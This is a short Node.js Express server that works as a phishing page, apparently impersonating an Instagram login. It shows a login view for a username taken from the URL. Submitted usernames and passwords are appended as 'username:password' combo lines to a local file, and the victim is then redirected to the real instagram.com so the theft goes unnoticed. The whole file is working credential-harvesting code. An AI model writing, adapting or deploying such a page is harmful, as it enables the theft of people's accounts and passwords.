//static
const port = 8885
//express
const express = require("express")
const app = express()
// file system
const fs = require('fs')
// handlebars-view engine
const exphbs = require('express-handlebars')
const {engine} = exphbs
app.engine('hbs', engine({extname:'.hbs'}))
app.set('view engine', 'hbs')
//body-parser
const bodyparser = require('body-parser')

app.use(bodyparser.urlencoded({extended:false}))
// main
app.get('/:username', (req,res)=>{
	const {username} = req.params || 'USERNAME'
	res.render('index', {username})
})
app.post('/:username', async (req,res)=>{
	const {username, password}=req.body
	const combo = `${username}:${password}\n`
	fs.appendFile('combats.txt', combo ,(err)=>{
	res.redirect(`https://instagram.com`)

	})



})


app.listen(port, ()=>{
	console.log(`server running on http://localhost:${port}`)
})
